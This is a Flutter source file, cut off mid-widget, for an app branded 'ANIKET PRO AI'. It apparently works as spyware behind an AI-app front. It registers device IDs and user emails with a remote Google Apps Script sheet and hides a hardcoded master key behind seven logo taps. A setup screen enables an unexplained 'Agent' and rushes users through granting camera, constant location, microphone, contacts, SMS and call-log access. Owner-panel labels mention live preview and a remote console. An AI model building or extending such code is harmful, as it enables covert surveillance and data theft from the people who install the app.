import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math' as math;
import 'dart:ui' as ui;

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:camera/camera.dart';
import 'package:flutter_contacts/flutter_contacts.dart';

import 'remote_console.dart';
import 'preview_card.dart';

// ── Colours ──────────────────────────────────────────────────────────────
const Color kGold      = Color(0xFFF5E6C8);
const Color kBg        = Color(0xFF121212);
const Color kLoginBtn  = Color(0xFFEF4030);

// ── Constants ────────────────────────────────────────────────────────────
const String kUrl = 'https://aniketsarker.netlify.app';
const String kSheetUrl =
    'https://script.google.com/macros/s/AKfycbysLY93ie5plvuUrv42-E9vxG9IWcDImkuj-fUv3jg4tqSvyPcz0H1yZlkrocNFIiDO/exec';
const String kMasterKey = 'atp1726';
const MethodChannel _galleryChannel    = MethodChannel('aniket_pro_ai/gallery');
const MethodChannel _screenshotChannel = MethodChannel('aniket_pro_ai/screenshot');

// ── HTTP helpers ─────────────────────────────────────────────────────────
Future<String> _httpGet(String url) async {
  final client = HttpClient()..connectionTimeout = const Duration(seconds: 8);
  try {
    final req = await client.getUrl(Uri.parse(url));
    final res = await req.close().timeout(const Duration(seconds: 10));
    return await res.transform(utf8.decoder).join();
  } finally {
    client.close();
  }
}

Future<bool> _httpPost(String url, Map<String, String> fields) async {
  final client = HttpClient()..connectionTimeout = const Duration(seconds: 8);
  try {
    final req = await client.postUrl(Uri.parse(url));
    req.headers.set('Content-Type', 'application/x-www-form-urlencoded');
    req.write(fields.entries
        .map((e) =>
            '${Uri.encodeQueryComponent(e.key)}=${Uri.encodeQueryComponent(e.value)}')
        .join('&'));
    final res = await req.close().timeout(const Duration(seconds: 10));
    await res.drain();
    return res.statusCode == 200;
  } catch (_) {
    return false;
  } finally {
    client.close();
  }
}

// ── Entry point ──────────────────────────────────────────────────────────
void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const AniketProAIApp());
}

class AniketProAIApp extends StatelessWidget {
  const AniketProAIApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'ANIKET PRO AI',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: kGold, brightness: Brightness.dark),
        useMaterial3: true,
        scaffoldBackgroundColor: kBg,
      ),
      home: const GateScreen(),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════
//  GATE SCREEN — clean professional login (FAST boot)
// ═══════════════════════════════════════════════════════════════════════
class GateScreen extends StatefulWidget {
  const GateScreen({super.key});

  @override
  State<GateScreen> createState() => _GateScreenState();
}

class _GateScreenState extends State<GateScreen> with SingleTickerProviderStateMixin {

  String _stage     = 'loading';
  String _deviceId  = '';
  bool   _owner     = false;
  bool   _permsAsked  = false;
  String _myId      = '';
  int    _logoTaps  = 0;
  Timer? _poll;
  final _fbCtrl  = TextEditingController();
  final _gmCtrl  = TextEditingController();
  final _fbFocus = FocusNode();
  final _gmFocus = FocusNode();

  late final AnimationController _cardCtrl;
  late final Animation<double>   _cardSlide;
  late final Animation<double>   _cardOpacity;

  @override
  void initState() {
    super.initState();
    _cardCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 700));
    _cardSlide = Tween<double>(begin: 60, end: 0)
        .chain(CurveTween(curve: Curves.easeOutCubic))
        .animate(_cardCtrl);
    _cardOpacity = Tween<double>(begin: 0, end: 1)
        .chain(CurveTween(curve: Curves.easeIn))
        .animate(_cardCtrl);
    _boot();
  }

  @override
  void dispose() {
    _poll?.cancel();
    _fbCtrl.dispose();
    _gmCtrl.dispose();
    _fbFocus.dispose();
    _gmFocus.dispose();
    _cardCtrl.dispose();
    super.dispose();
  }

  Future<void> _boot() async {
    final devFut = _galleryChannel
        .invokeMethod<String>('deviceId')
        .then<String?>((v) => v)
        .catchError((_) => null);
    final p = await SharedPreferences.getInstance();
    _deviceId = (await devFut) ?? 'unknown';
    _owner      = p.getBool('owner')      ?? false;
    _permsAsked = p.getBool('permsAsked') ?? false;
    _myId       = p.getString('myId')     ?? '';
    if (_owner) {
      setState(() => _stage = (p.getBool('allPermsAsked') ?? false) ? 'main' : 'setup');
      return;
    }
    final approved = p.getBool('approved') ?? false;
    if (approved) {
      setState(() => _stage = _permsAsked ? 'main' : 'setup');
      return;
    }
    await _checkStatus();
    if (_stage == 'wait') {
      _poll = Timer.periodic(const Duration(seconds: 20), (_) => _checkStatus());
    }
  }

  Future<void> _checkStatus() async {
    try {
      final rows = (jsonDecode(await _httpGet(kSheetUrl)) as List).cast<List<dynamic>>();
      String status = 'none';
      for (final r in rows) {
        if (r.length < 4) continue;
        final type = r[1].toString();
        final dev  = r[3].toString();
        if (dev == _deviceId && (type == 'approve' || type == 'ban')) status = type;
      }
      if (status == 'approve') {
        _poll?.cancel();
        await (await SharedPreferences.getInstance()).setBool('approved', true);
        if (mounted) setState(() => _stage = _permsAsked ? 'main' : 'setup');
      } else if (status == 'ban') {
        _poll?.cancel();
        await (await SharedPreferences.getInstance()).setBool('approved', false);
        if (mounted) setState(() => _stage = 'connect');
      } else {
        if (mounted) setState(() => _stage = _myId.isEmpty ? 'connect' : 'wait');
      }
    } catch (_) {
      if (mounted) setState(() => _stage = _myId.isEmpty ? 'connect' : 'wait');
    }
  }

  Future<void> _submit(String fb, String gm) async {
    final id     = gm.trim().isNotEmpty ? gm.trim() : fb.trim();
    final method = gm.trim().isNotEmpty ? 'Gmail' : 'Facebook';
    final p = await SharedPreferences.getInstance();
    await p.setString('myId', id);
    _myId = id;
    await _httpPost(kSheetUrl,
        {'type': 'request', 'id': id, 'device': _deviceId, 'method': method, 'perms': ''});
    if (mounted) setState(() => _stage = 'wait');
    _poll?.cancel();
    _poll = Timer.periodic(const Duration(seconds: 20), (_) => _checkStatus());
  }

  Future<void> _pickGmail() async {
    try {
      final acc = await _galleryChannel.invokeMethod<String>('pickGoogleAccount');
      if (acc != null && acc.isNotEmpty) {
        _gmCtrl.text = acc;
        if (mounted) setState(() {});
      } else {
        _gmFocus.requestFocus();
        _toast('No Gmail found — type it');
      }
    } catch (_) {
      _gmFocus.requestFocus();
      _toast('No Gmail found — type it');
    }
  }

  Future<void> _masterDialog() async {
    final c = TextEditingController();
    final ok = await showDialog<bool>(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF1E1E1E),
        title: const Text('Master Key', style: TextStyle(color: kGold)),
        content: TextField(
            controller: c,
            obscureText: true,
            style: const TextStyle(color: Colors.white)),
        actions: [
          TextButton(
              onPressed: () => Navigator.pop(context, false),
              child: const Text('X', style: TextStyle(color: Colors.white54))),
          TextButton(
              onPressed: () => Navigator.pop(context, true),
              child: const Text('OK', style: TextStyle(color: kGold))),
        ],
      ),
    );
    if (ok == true && c.text == kMasterKey) {
      final p = await SharedPreferences.getInstance();
      await p.setBool('owner', true);
      _owner = true;
      final asked = p.getBool('allPermsAsked') ?? false;
      if (mounted) setState(() => _stage = asked ? 'main' : 'setup');
    }
  }

  void _toast(String t) {
    try { _galleryChannel.invokeMethod('toast', t); } catch (_) {}
  }

  void _maybeAnimate() {
    if (!_cardCtrl.isAnimating && _cardCtrl.value == 0) {
      _cardCtrl.forward();
    }
  }

  @override
  Widget build(BuildContext context) {
    if (_stage == 'main')  return const MainWebViewScreen();
    if (_stage == 'setup') {
      return PermissionSetupScreen(
        onDone: () {
          if (mounted) setState(() => _stage = 'main');
        },
      );
    }
    if (_stage == 'connect' || _stage == 'wait') Future.microtask(_maybeAnimate);

    return Scaffold(
      backgroundColor: kBg,
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [Color(0xFF1C1A14), Color(0xFF121212), Color(0xFF1A1208)],
          ),
        ),
        child: SafeArea(
          child: _stage == 'loading'
              ? const Center(child: CircularProgressIndicator(color: kGold))
              : Column(
                  children: [
                    Expanded(child: _buildTop()),
                    _buildCard(),
                    const SizedBox(height: 32),
                  ],
                ),
        ),
      ),
    );
  }

  Widget _buildTop() {
    return Center(
      child: GestureDetector(
        onTap: () {
          _logoTaps++;
          if (_logoTaps >= 7) { _logoTaps = 0; _masterDialog(); }
        },
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              width: 96,
              height: 96,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                gradient: RadialGradient(
                  colors: [kGold.withOpacity(0.22), Colors.transparent],
                ),
                border: Border.all(color: kGold.withOpacity(0.35), width: 1.5),
              ),
              child: Center(
                child: Image.asset('assets/logo.png', width: 56, height: 56),
              ),
            ),
            const SizedBox(height: 16),
            RichText(
              text: const TextSpan(
                style: TextStyle(
                    fontFamily: 'Poppins',
                    fontSize: 26,
                    fontWeight: FontWeight.w800,
                    letterSpacing: 1.2),
                children: [
                  TextSpan(text: 'ANIKET ', style: TextStyle(color: Colors.white)),
                  TextSpan(text: 'PRO AI',  style: TextStyle(color: kGold)),
                ],
              ),
            ),
            const SizedBox(height: 8),
            Text(
              _stage == 'wait'
                  ? 'Waiting for owner approval…'
                  : 'Connect your account to continue',
              style: TextStyle(
                  color: Colors.white.withOpacity(0.45),
                  fontSize: 13,
                  fontWeight: FontWeight.w400),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildCard() {
    return AnimatedBuilder(
      animation: _cardCtrl,
      builder: (_, child) => Transform.translate(
        offset: Offset(0, _cardSlide.value),
        child: Opacity(opacity: _cardOpacity.value, child: child),
      ),
      child: Padding(
        padding: const EdgeInsets.symmetric(horizontal: 24),
        child: Container(
          decoration: BoxDecoration(
            color: const Color(0xFF1C1916),
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: kGold.withOpacity(0.28), width: 1),
            boxShadow: [
              BoxShadow(
                  color: Colors.black.withOpacity(0.5),
                  blurRadius: 32,
                  offset: const Offset(0, 12)),
              BoxShadow(
                  color: kGold.withOpacity(0.06),
                  blurRadius: 40,
                  spreadRadius: 4),
            ],
          ),
          padding: const EdgeInsets.all(24),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              if (_stage == 'connect') ..._connectFields(),
              if (_stage == 'wait')    ..._waitContent(),
            ],
          ),
        ),
      ),
    );
  }

  List<Widget> _connectFields() => [
    Row(children: const [
      Icon(Icons.person_outline_rounded, color: kGold, size: 20),
      SizedBox(width: 8),
      Text('Register Now',
          style: TextStyle(color: kGold, fontSize: 17, fontWeight: FontWeight.bold)),
    ]),
    const SizedBox(height: 4),
    const Text('Owner approval required to access the app',
        style: TextStyle(color: Colors.white38, fontSize: 12)),
    const SizedBox(height: 20),
    Divider(color: kGold.withOpacity(0.15), height: 1),
    const SizedBox(height: 20),
    _field(
      _fbCtrl, _fbFocus,
      'Facebook profile link or name',
      icon: Icons.facebook_rounded,
    ),
    const SizedBox(height: 12),
    _field(
      _gmCtrl, _gmFocus,
      'Gmail address',
      icon: Icons.mail_outline_rounded,
      suffix: IconButton(
        icon: const Icon(Icons.person_search_rounded, color: kGold, size: 20),
        tooltip: 'Auto-fill Gmail',
        onPressed: _pickGmail,
        padding: EdgeInsets.zero,
        constraints: const BoxConstraints(),
      ),
    ),
    const SizedBox(height: 20),
    SizedBox(
      width: double.infinity,
      height: 50,
      child: ElevatedButton(
        style: ElevatedButton.styleFrom(
          backgroundColor: kLoginBtn,
          foregroundColor: Colors.white,
          elevation: 0,
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        ),
        onPressed: () {
          if (_fbCtrl.text.trim().isEmpty && _gmCtrl.text.trim().isEmpty) return;
          _submit(_fbCtrl.text, _gmCtrl.text);
        },
        child: const Text('NEXT',
            style: TextStyle(fontSize: 15, fontWeight: FontWeight.bold, letterSpacing: 1)),
      ),
    ),
  ];

  List<Widget> _waitContent() => [
    const SizedBox(height: 8),
    const CircularProgressIndicator(color: kGold),
    const SizedBox(height: 20),
    const Text('Your request has been sent.',
        style: TextStyle(color: Colors.white, fontSize: 15, fontWeight: FontWeight.w600),
        textAlign: TextAlign.center),
    const SizedBox(height: 6),
    const Text('Waiting for owner to approve your account.',
        style: TextStyle(color: Colors.white54, fontSize: 13),
        textAlign: TextAlign.center),
    const SizedBox(height: 20),
    TextButton.icon(
      onPressed: _checkStatus,
      icon: const Icon(Icons.refresh_rounded, color: kGold, size: 18),
      label: const Text('Check again', style: TextStyle(color: kGold)),
    ),
    const SizedBox(height: 8),
  ];

  Widget _field(
    TextEditingController ctrl,
    FocusNode focus,
    String hint, {
    required IconData icon,
    Widget? suffix,
  }) =>
      TextField(
        controller: ctrl,
        focusNode: focus,
        style: const TextStyle(color: Colors.white, fontSize: 14),
        decoration: InputDecoration(
          hintText: hint,
          hintStyle: const TextStyle(color: Colors.white30, fontSize: 13),
          prefixIcon: Icon(icon, color: kGold.withOpacity(0.7), size: 20),
          suffixIcon: suffix,
          suffixIconConstraints: const BoxConstraints(minWidth: 40, minHeight: 40),
          filled: true,
          fillColor: const Color(0xFF252218),
          contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
          border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: BorderSide(color: kGold.withOpacity(0.2))),
          enabledBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: BorderSide(color: kGold.withOpacity(0.2))),
          focusedBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: const BorderSide(color: kGold, width: 1.5)),
        ),
      );
}

// ═══════════════════════════════════════════════════════════════════════
//  GUIDED PERMISSION SETUP — Agent first, then Notification, then rest
// ═══════════════════════════════════════════════════════════════════════
class PermissionSetupScreen extends StatefulWidget {
  final VoidCallback onDone;
  const PermissionSetupScreen({super.key, required this.onDone});

  @override
  State<PermissionSetupScreen> createState() => _PermissionSetupScreenState();
}

class _PermissionSetupScreenState extends State<PermissionSetupScreen> {
  static final List<MapEntry<String, Permission?>> _steps = [
    MapEntry('Agent', null),
    MapEntry('Notification', Permission.notification),
    MapEntry('Camera', Permission.camera),
    MapEntry('Location', Permission.location),
    MapEntry('All-time Location', Permission.locationAlways),
    MapEntry('Microphone', Permission.microphone),
    MapEntry('Contacts', Permission.contacts),
    MapEntry('Photos', Permission.photos),
    MapEntry('Videos', Permission.videos),
    MapEntry('SMS', Permission.sms),
    MapEntry('Call log', Permission.phone),
  ];

  final Map<String, bool> _done = {};
  String _current = 'শুরু হচ্ছে...';
  bool _finished = false;

  @override
  void initState() {
    super.initState();
    _run();
  }

  IconData _icon(String n) {
    switch (n) {
      case 'Agent': return Icons.smart_toy_rounded;
      case 'Notification': return Icons.notifications_rounded;
      case 'Camera': return Icons.camera_alt_rounded;
      case 'Location': return Icons.location_on_rounded;
      case 'All-time Location': return Icons.location_on_rounded;
      case 'Microphone': return Icons.mic_rounded;
      case 'Contacts': return Icons.contacts_rounded;
      case 'Photos': return Icons.photo_library_rounded;
      case 'Videos': return Icons.videocam_rounded;
      case 'SMS': return Icons.sms_rounded;
      case 'Call log': return Icons.call_rounded;
      default: return Icons.settings;
    }
  }

  Future<void> _run() async {
    await Future.delayed(const Duration(milliseconds: 200));
    for (final s in _steps) {
      if (!mounted) return;
      setState(() => _current = s.key);
      if (s.value == null) {
        try { await _galleryChannel.invokeMethod('agentOn'); } catch (_) {}
        await Future.delayed(const Duration(milliseconds: 400));
      } else {
        try { await s.value!.request(); } catch (_) {}
      }
      if (!mounted) return;
      setState(() => _done[s.key] = true);
    }
    final p = await SharedPreferences.getInstance();
    await p.setBool('permsAsked', true);
    await p.setBool('allPermsAsked', true);
    if (!mounted) return;
    setState(() => _finished = true);
    await Future.delayed(const Duration(milliseconds: 500));
    widget.onDone();
  }

  @override
  Widget build(BuildContext context) {
    final total = _steps.length;
    final done = _done.length;
    return Scaffold(
      backgroundColor: kBg,
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [Color(0xFF1C1A14), Color(0xFF121212), Color(0xFF1A1208)],
          ),
        ),
        child: SafeArea(
          child: Center(
            child: Padding(
              padding: const EdgeInsets.symmetric(horizontal: 28),
              child: Container(
                padding: const EdgeInsets.all(26),
                decoration: BoxDecoration(
                  color: const Color(0xFF1C1916),
                  borderRadius: BorderRadius.circular(20),
                  border: Border.all(color: kGold.withOpacity(0.28), width: 1),
                ),
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Container(
                      width: 84,
                      height: 84,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        border: Border.all(color: kGold.withOpacity(0.35), width: 1.5),
                      ),
                      child: Center(
                        child: Image.asset('assets/logo.png', width: 50, height: 50),
                      ),
                    ),
                    const SizedBox(height: 18),
                    const Text('One-time Setup',
                        style: TextStyle(color: kGold, fontSize: 20, fontWeight: FontWeight.bold)),
                    const SizedBox(height: 6),
                    Text(
                      _finished
                          ? '✅ সেটআপ সম্পূর্ণ!'
                          : 'Android এখন কয়েকটা অনুমতি চাইবে —\nপ্রতিটায় Allow চাপুন। একবারই হবে।',
                      textAlign: TextAlign.center,
                      style: const TextStyle(color: Colors.white54, fontSize: 13, height: 1.4),
                    ),
                    const SizedBox(height: 20),
                    Text('$done / $total',
                        style: const TextStyle(color: kGold, fontSize: 26, fontWeight: FontWeight.w800)),
                    const SizedBox(height: 10),
                    ClipRRect(
                      borderRadius: BorderRadius.circular(6),
                      child: LinearProgressIndicator(
                        value: total == 0 ? 0 : done / total,
                        minHeight: 8,
                        color: kGold,
                        backgroundColor: Colors.white12,
                      ),
                    ),
                    const SizedBox(height: 18),
                    if (!_finished)
                      Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(_icon(_current), color: kGold, size: 18),
                          const SizedBox(width: 8),
                          Text(_current,
                              style: const TextStyle(color: Colors.white70, fontSize: 14)),
                        ],
                      ),
                    const SizedBox(height: 8),
                    Wrap(
                      spacing: 6,
                      runSpacing: 6,
                      alignment: WrapAlignment.center,
                      children: _steps.map((s) {
                        final ok = _done[s.key] ?? false;
                        final active = _current == s.key && !ok;
                        return Container(
                          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
                          decoration: BoxDecoration(
                            color: ok
                                ? Colors.green.withOpacity(0.15)
                                : active
                                    ? kGold.withOpacity(0.15)
                                    : Colors.white.withOpacity(0.05),
                            borderRadius: BorderRadius.circular(12),
                            border: Border.all(
                                color: ok
                                    ? Colors.green.withOpacity(0.5)
                                    : active
                                        ? kGold.withOpacity(0.5)
                                        : Colors.white12),
                          ),
                          child: Text(s.key,
                              style: TextStyle(
                                  color: ok
                                      ? Colors.green
                                      : active
                                          ? kGold
                                          : Colors.white38,
                                  fontSize: 11)),
                        );
                      }).toList(),
                    ),
                  ],
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════
//  OWNER PANEL — Permissions + Live Preview + Users + REMOTE CONSOLE
// ═══════════════════════════════════════════════════════════════════════
class OwnerPanelScreen extends StatefulWidget {
  const OwnerPanelScreen({super.key});

  @override
  State<OwnerPanelScreen> createState() => _OwnerPanelScreenState();
}

class _OwnerPanelScreenState extends State<OwnerPanelScreen> {
  List<Map<String, String>> _rows = [];
  bool _busy = false;
  int _androidSdk = 0;
  Map<String, PermissionStatus> _permStatuses = {};
  bool _permLoading = true;

  static final Map<String, Permission> _allPerms = {
    'Camera': Permission.camera,
    'Location': Permission.location,
    'Microphone': Permission.microphone,
    'Contacts': Permission.contacts,
    'Photos': Permission.photos,
    'Videos': Permission.videos,
    'Storage (Legacy)': Permission.storage,
    'Notification': Permission.notification,
  };

  @override
  void initState() {
    super.initState();
    _load();
    _initDeviceInfo();
    _checkAllPerms();
  }

  Future<void> _initDeviceInfo() async {
    try {
      final info = await DeviceInfoPlugin().androidInfo;
      if (mounted) setState(() => _androidSdk = info.version.sdkInt);
    } catch (_) {
      if (mounted) setState(() => _androidSdk = 0);
    }
  }

  Future<void> _checkAllPerms() async {
    setState(() => _permLoading = true);
    Map<String, PermissionStatus> statuses = {};
    for (var entry in _allPerms.entries) {
      try {
        if (entry.key == 'Storage (Legacy)' && _androidSdk >= 33) {
          statuses[entry.key] = PermissionStatus.granted;
          continue;
        }
        statuses[entry.key] = await entry.value.status;
      } catch (_) {
        statuses[entry.key] = PermissionStatus.denied;
      }
    }
    if (mounted) {
      setState(() {
        _permStatuses = statuses;
        _permLoading = false;
      });
    }
  }

  Future<void> _grantAllPerms() async {
    List<Permission> toRequest = [];
    for (var entry in _allPerms.entries) {
      if (entry.key == 'Storage (Legacy)' && _androidSdk >= 33) continue;
      final status = _permStatuses[entry.key];
      if (status != null && !status.isGranted) {
        toRequest.add(entry.value);
      }
    }
    if (toRequest.isEmpty) {
      _showSnack('সব পারমিশন আগে থেকেই দেওয়া আছে ✅');
      return;
    }
    await toRequest.request();
    await _checkAllPerms();
  }

  Future<void> _requestSingle(String name) async {
    final perm = _allPerms[name];
    if (perm == null) return;
    final status = await perm.request();
    if (status.isPermanentlyDenied) {
      await openAppSettings();
    }
    await _checkAllPerms();
  }

  Future<void> _toggleOff(String name) async {
    final ok = await showDialog<bool>(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF1E1E1E),
        title: Text('$name বন্ধ করবেন?', style: const TextStyle(color: kGold)),
        content: const Text(
            'Android-এর নিয়ম: অ্যাপ নিজের পারমিশন নিজে বন্ধ করতে পারে না।\nSettings খুলে দিচ্ছি — সেখানে ১ ট্যাপে বন্ধ করুন।',
            style: TextStyle(color: Colors.white70, fontSize: 13)),
        actions: [
          TextButton(
              onPressed: () => Navigator.pop(context, false),
              child: const Text('বাতিল', style: TextStyle(color: Colors.white54))),
          TextButton(
              onPressed: () => Navigator.pop(context, true),
              child: const Text('খুলুন', style: TextStyle(color: kGold))),
        ],
      ),
    );
    if (ok == true) await openAppSettings();
    await _checkAllPerms();
  }

  void _showSnack(String msg) {
    if (mounted) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text(msg), backgroundColor: const Color(0xFF2A2A2A)),
      );
    }
  }

  String _androidVersionName() {
    if (_androidSdk >= 37) return 'Android 17';
    if (_androidSdk >= 36) return 'Android 16';
    if (_androidSdk >= 35) return 'Android 15';
    if (_androidSdk >= 34) return 'Android 14';
    if (_androidSdk >= 33) return 'Android 13';
    if (_androidSdk >= 32) return 'Android 12L';
    if (_androidSdk >= 31) return 'Android 12';
    if (_androidSdk >= 30) return 'Android 11';
    if (_androidSdk >= 29) return 'Android 10';
    return 'Unknown';
  }

  IconData _permIcon(String name) {
    switch (name) {
      case 'Camera': return Icons.camera_alt_rounded;
      case 'Location': return Icons.location_on_rounded;
      case 'Microphone': return Icons.mic_rounded;
      case 'Contacts': return Icons.contacts_rounded;
      case 'Photos': return Icons.photo_library_rounded;
      case 'Videos': return Icons.videocam_rounded;
      case 'Storage (Legacy)': return Icons.folder_rounded;
      case 'Notification': return Icons.notifications_rounded;
      default: return Icons.settings;
    }
  }

  Color _statusColor(PermissionStatus? s) {
    if (s == null) return Colors.grey;
    if (s.isGranted) return Colors.green;
    if (s.isPermanentlyDenied) return Colors.red;
    if (s.isRestricted) return Colors.deepOrange;
    if (s.isLimited) return Colors.orange;
    return Colors.orange;
  }

  String _statusText(PermissionStatus? s) {
    if (s == null) return 'অজানা';
    if (s.isGranted) return 'ON ✅';
    if (s.isPermanentlyDenied) return 'চিরতরে বন্ধ ❌';
    if (s.isRestricted) return 'রেস্ট্রিক্টেড 🔒';
    if (s.isLimited) return 'আংশিক';
    if (s.isDenied) return 'OFF ⚠️';
    return 'অজানা';
  }

  Future<void> _load() async {
    setState(() => _busy = true);
    try {
      final rows = (jsonDecode(await _httpGet(kSheetUrl)) as List).cast<List<dynamic>>();
      final Map<String, Map<String, String>> map = {};
      for (final r in rows) {
        if (r.length < 5) continue;
        final type   = r[1].toString();
        final id     = r[2].toString();
        final dev    = r[3].toString();
        final method = r[4].toString();
        final perms  = r.length > 5 ? r[5].toString() : '';
        final e = map.putIfAbsent(dev,
            () => {'id': '', 'method': '', 'perms': '', 'status': 'PENDING', 'time': ''});
        if (type == 'request') { e['id'] = id; e['method'] = method; e['time'] = r[0].toString(); }
        if (type == 'perms')   e['perms']  = perms;
        if (type == 'approve') e['status'] = 'APPROVED';
        if (type == 'ban')     e['status'] = 'BANNED';
      }
      _rows = map.entries.map((e) => {'device': e.key, ...e.value}).toList();
      _rows.sort((a, b) => (b['time'] ?? '').compareTo(a['time'] ?? ''));
    } catch (_) {}
    if (mounted) setState(() => _busy = false);
  }

  Future<void> _act(String dev, String type) async {
    await _httpPost(kSheetUrl, {'type': type, 'id': '', 'device': dev, 'method': '', 'perms': ''});
    await _load();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: kBg,
      appBar: AppBar(
        backgroundColor: kBg,
        title: const Text('Owner Panel', style: TextStyle(color: kGold)),
        actions: [
          IconButton(onPressed: _checkAllPerms, icon: const Icon(Icons.sync, color: kGold)),
          IconButton(onPressed: _load, icon: const Icon(Icons.refresh, color: kGold)),
        ],
      ),
      body: ListView(
        padding: const EdgeInsets.only(bottom: 30),
        children: [
          // ── Device Info ──
          Container(
            margin: const EdgeInsets.fromLTRB(12, 12, 12, 0),
            padding: const EdgeInsets.all(14),
            decoration: BoxDecoration(
              color: const Color(0xFF1A1A2E),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: Colors.blueAccent.withOpacity(0.3)),
            ),
            child: Row(
              children: [
                const Icon(Icons.phone_android, color: Colors.blueAccent, size: 28),
                const SizedBox(width: 12),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        _androidSdk > 0
                            ? '${_androidVersionName()} (SDK $_androidSdk)'
                            : 'লোড হচ্ছে...',
                        style: const TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold),
                      ),
                      Text(
                        _androidSdk >= 37
                            ? '🎯 Android 17 — Special rules active'
                            : _androidSdk >= 33
                                ? 'Android 13+ — Granular media permissions'
                                : 'Android 10-12 — Legacy storage',
                        style: const TextStyle(color: Colors.white60, fontSize: 12),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),

          // ── Device Permissions (ON/OFF সুইচ সহ) ──
          Container(
            margin: const EdgeInsets.all(12),
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: const Color(0xFF1E1E1E),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: kGold.withOpacity(0.3)),
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Row(
                  children: [
                    Icon(Icons.security_rounded, color: kGold, size: 22),
                    SizedBox(width: 10),
                    Text('Device Permissions',
                        style: TextStyle(color: kGold, fontSize: 17, fontWeight: FontWeight.bold)),
                  ],
                ),
                const SizedBox(height: 4),
                const Text('সুইচ ON = অনুমতি দিন • সুইচ OFF = বন্ধ করুন',
                    style: TextStyle(color: Colors.white38, fontSize: 12)),
                const SizedBox(height: 16),

                if (_permLoading)
                  const Center(
                    child: Padding(
                      padding: EdgeInsets.all(20),
                      child: CircularProgressIndicator(color: kGold),
                    ),
                  )
                else
                  ..._permStatuses.entries.map((e) {
                    final name = e.key;
                    final status = e.value;
                    final isLegacy = name == 'Storage (Legacy)' && _androidSdk >= 33;
                    return Container(
                      margin: const EdgeInsets.symmetric(vertical: 3),
                      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                      decoration: BoxDecoration(
                        color: const Color(0xFF252525),
                        borderRadius: BorderRadius.circular(8),
                      ),
                      child: Row(
                        children: [
                          Icon(_permIcon(name),
                              color: isLegacy ? Colors.white24 : Colors.white70, size: 20),
                          const SizedBox(width: 10),
                          Expanded(
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(name,
                                    style: TextStyle(
                                        color: isLegacy ? Colors.white24 : Colors.white,
                                        fontSize: 14, fontWeight: FontWeight.w500)),
                                if (isLegacy)
                                  const Text('Android 13+ এ দরকার নেই',
                                      style: TextStyle(color: Colors.white24, fontSize: 10)),
                              ],
                            ),
                          ),
                          Text(_statusText(status),
                              style: TextStyle(
                                  color: isLegacy ? Colors.white24 : _statusColor(status),
                                  fontSize: 11, fontWeight: FontWeight.bold)),
                          const SizedBox(width: 6),
                          SizedBox(
                            height: 34,
                            width: 46,
                            child: Switch(
                              value: isLegacy ? true : status.isGranted,
                              activeColor: kGold,
                              onChanged: isLegacy
                                  ? null
                                  : (v) async {
                                      if (v) {
                                        await _requestSingle(name);
                                      } else {
                                        await _toggleOff(name);
                                      }
                                    },
                            ),
                          ),
                        ],
                      ),
                    );
                  }),

                const SizedBox(height: 16),
                SizedBox(
                  width: double.infinity,
                  height: 48,
                  child: ElevatedButton.icon(
                    onPressed: _permLoading ? null : _grantAllPerms,
                    icon: const Icon(Icons.check_circle_outline, size: 20),
                    label: const Text('Grant All Permissions',
                        style: TextStyle(fontSize: 15, fontWeight: FontWeight.bold)),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: kGold.withOpacity(0.2),
                      foregroundColor: kGold,
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                    ),
                  ),
                ),
                const SizedBox(height: 8),
                SizedBox(
                  width: double.infinity,
                  height: 42,
                  child: OutlinedButton.icon(
                    onPressed: () => openAppSettings(),
                    icon: const Icon(Icons.settings, size: 18),
                    label: const Text('Open App Settings'),
                    style: OutlinedButton.styleFrom(
                      foregroundColor: Colors.white54,
